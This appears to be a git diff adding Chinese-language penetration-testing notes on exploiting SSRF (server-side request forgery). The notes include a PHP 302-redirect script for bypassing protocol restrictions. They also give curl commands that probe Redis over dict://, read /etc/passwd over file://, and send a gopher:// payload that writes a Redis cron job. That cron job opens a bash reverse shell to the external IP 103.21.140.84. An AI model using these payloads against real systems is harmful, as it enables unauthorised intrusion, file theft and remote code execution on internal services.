@@ -22,3 +22,37 @@
 
 但这样可以用 http://abc@10.153.138.81/ 绕过
 
+## 收藏
+
+ [https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html](https://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html) 
+
+## 利用302跳转等来绕过协议限制
+
+当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL
+
+那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。
+
+我们继续构造一个302跳转服务，代码如下302.php:
+
+```php
+<?php  
+    $schema = $_GET['s'];
+	$ip     = $_GET['i'];
+	$port   = $_GET['p'];
+	$query  = $_GET['q'];
+	if(empty($port))
+    {      
+		header("Location:$schema://$ip/$query"); 
+    }else 
+    {
+        header("Location: $schema://$ip:$port/$query"); 
+    }
+```
+
+
+
+#### 利用测试
+
+```
+# dict protocol - 探测Redisdict://127.0.0.1:6379/info  curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&i=127.0.0.1&port=6379&query=info'# file protocol - 任意文件读取curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&query=/etc/passwd'# gopher protocol - 一键反弹Bash# * 注意: gopher跳转的时候转义和`url`入参的方式有些区别curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&i=127.0.0.1&p=6389&query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/103.21.140.84/6789%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  %0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
+```
